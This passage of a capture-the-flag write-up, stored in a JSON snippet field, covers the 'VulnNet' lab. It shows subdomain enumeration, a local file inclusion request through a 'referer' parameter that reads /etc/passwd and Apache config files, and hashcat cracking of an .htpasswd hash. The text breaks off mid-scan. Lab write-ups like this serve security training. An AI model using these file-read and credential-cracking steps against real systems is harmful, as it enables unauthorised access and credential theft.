    "snippet": "[0x01] OutlineVulnNet has a Medium difficulty rating running PHP as its web language. The brief states that it takes a more realistic approach to infiltrating the system.Our first step is to enumerate the subdomains and collect a username and password using LFI.Then, using an unauthenticated file upload vulnerability, we upload our reverse shell, and finally, all privilege escalation is accomplished through the use of a backup script and tar abuse.[0x02] ReconOur scope document says we should add vulnnet.thm to our hosts file.sudo echo &#39;10.10.94.236 vulnnet.thm&#39; &amp;gt;&amp;gt; /etc/hostsRunning nmap we find 2 ports open.

It’s always good practice to have automatic Recon going while you’re working. It will save you a lot of time when you need other avenues to explore.gobustergobuster vhost -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vulnnet-vhost.gobustergobuster dir -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o vulnnet-dir.gobusterWalking the websiteWhile our gobuster is scanning we can take a look at the website.  The first page has a subscribe form, checking the developer tools in Firefox we can see that there is no POST request and the button takes you back to the main page.Watching the network tab on the dev tools we can see that there are two js files being loaded, index__7ed54732.js and index__d8338055.js, we’ll take note of these and continue walking the site.Clicking the sign-in button takes you to a login form.  Brute forcing isn’t an option as we have no usernames or passwords to try.  Sign Up and Forgot Password are just Anchor Tags and don’t go anywhere.After spending a few minutes with BurpSuite trying various SQLI attacks we’re not getting any error messages or indication that SQLI is possible.  There isn’t anything else to try on the website, so we need to find other endpoints to probe.Now we move on to the JS files.  We can save them down with curl -O and run them through a bash port of tomnomnom’s go tool gf that I coded last week which I called pursue.mkdir srccd srccurl -O http://vulnnet.thm/js/index__7ed54732.jscurl -O http://vulnnet.thm/js/index__d8338055.jspursue --domains | sort -ubroadcast.vulnnet.thmvulnnet.thmSearching for domains in these two JS files we find vulnnet.thm which is the page we are on, and a new subdomain called broadcast.vulnnet.thm.  gobuster will find this address using ‘subdomains-top1million-5000.txt’broadcast.vulnnet.thmAdding broadcast.vulnnet.thm address to /etc/hosts and checking the website we’re prompted for a username and password.We’ll set gobuster to scan on broadcast.vulnnet.thm and check to see if there are any pages that do not require authentication. We’ll have to set -b 401 to ignore 401 Unauthorized status codes.gobuster dir -u http://broadcast.vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o broadcast.dirs -b 401Now we’re stuck since we’ve exhausted vulnnet.thm. Our directory scan didn’t find anything, and we’re waiting on our gobuster scan of broadcast.vulnnet.thm. We can go back and take a deeper look at the JS files.[0x03] Local File InclusionRunning pursue on our JS files shows that index__d8338055.js has a call with a referer parameter.pursue --query./index__d8338055.js:http://vulnnet.thm/index.php?referer=The code is heavily compacted, I honestly have no idea how to read it, but clearly it must be calling http://vulnnet.thm/index.php and setting referer= to something. Let’s take a closer look in BurpSuite.---snip---, n.n = function (e) {var t = e &amp;amp;&amp;amp; e.__esModule ? function () { return e.default } : function () { return e }; return n.d(t, &quot;a&quot;, t), t}, n.o = function (e, t) { return Object.prototype.hasOwnProperty.call(e, t) },         n.p = &quot;http://vulnnet.thm/index.php?referer=&quot;, n(n.s = 0)}({---snip---referer=When clicking on the subscribe button we can see that there is a new Header Referer: http://vulnnet.thm/?. So this JS file and function is setting referer to the current page we are currently on.  When you see query parameters in URLs, try LFI Local File Inclusion.Loading the page and sending the request to the repeater tab of Burp allows us to try many types of paths for our LFI.GET /index.php?referer=/etc/passwd HTTP/1.1Host: vulnnet.thmUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Trying /etc/passwd and searching the response for root: we get one match, meaning we read out the contents of /etc/passwd and we now have a list of all the users on this system.root:x:0:0:root:/root:/bin/bash---snip---server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bashmysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:113:65534::/run/sshd:/usr/sbin/nologinApache configNow we can read out files that belong to the web server we should be able to find the Apache config files.From our nmap banners we know this system is running Apache httpd 2.4.29 on Ubuntu.  Searching the web for this information we’ll find that the default config location is /etc/apache2/apache2.conf and /etc/apache2/sites-available/000-default.confChecking /etc/apache2/sites-available/000-default.conf and finding the section for broadcast.vulnnet.thm we can see the path for AuthUserFile is /etc/apache2/.htpasswd.  This file should have a username and password.---snip---&amp;lt;VirtualHost *:80&amp;gt;	ServerAdmin webmaster@localhost	ServerName broadcast.vulnnet.thm	DocumentRoot /var/www/html	ErrorLog ${APACHE_LOG_DIR}/error.log	CustomLog ${APACHE_LOG_DIR}/access.log combined	&amp;lt;Directory /var/www/html&amp;gt;		Order allow,deny		allow from all		AuthType Basic		AuthName &quot;Restricted Content&quot;		AuthUserFile /etc/apache2/.htpasswd		Require valid-user	&amp;lt;/Directory&amp;gt;&amp;lt;/VirtualHost&amp;gt;---snip---Loading the .htaccess file we can see the username and password required for logging in.Trying this as the username and password doesn’t work. A string starting with $apr1$ is going to be a hash of the password. hashcat should be able to crack this.developers:$apr1$[REDACTED]Checking the example list of hashes from hashcat we can see this is 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR).  Given enough time the password is eventually cracked, and we’re able to log into broadcast.vulnnet.thm.hashcat &#39;$apr1$[REDACTED]&#39; /usr/share/wordlists/rockyou.txt -m 1600---snip---$apr1$[REDACTED]:[REDACTED]Password SprayingNow we have a username and password we should try them on every possible service.

I’m immediately thing file upload for reverse shell.Trying the password on the Login button doesn’t work.  Now it’s time to run our recon with gobuster in dir mode.After spending a few minutes trying to sign up we are unable to get past the error.  Given this is blocked behind developer credentials we’ll assume the site is not fully functional.Reviewing our gobuster scan and filtering out the status codes of 403 Forbidden we can see a files’ directory.gobuster dir -u http://broadcast.vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -U developers -P [REDACTED] -o broadcast.dirsgrep -v 403 broadcast.dirs/images               (Status: 301) [Size: 331] [--&amp;gt; http://broadcast.vulnnet.thm/images/]/includes             (Status: 301) [Size: 333] [--&amp;gt; http://broadcast.vulnnet.thm/includes/]/cache                (Status: 301) [Size: 330] [--&amp;gt; http://broadcast.vulnnet.thm/cache/]/plugins              (Status: 301) [Size: 332] [--&amp;gt; http://broadcast.vulnnet.thm/plugins/]/js                   (Status: 301) [Size: 327] [--&amp;gt; http://broadcast.vulnnet.thm/js/]/ajax                 (Status: 301) [Size: 329] [--&amp;gt; http://broadcast.vulnnet.thm/ajax/]/files                (Status: 301) [Size: 330] [--&amp;gt; http://broadcast.vulnnet.thm/files/]/LICENSE              (Status: 200) [Size: 2588]/api                  (Status: 301) [Size: 328] [--&amp;gt; http://broadcast.vulnnet.thm/api/]/styles               (Status: 301) [Size: 331] [--&amp;gt; http://broadcast.vulnnet.thm/styles/]/readme               (Status: 200) [Size: 2968]/.
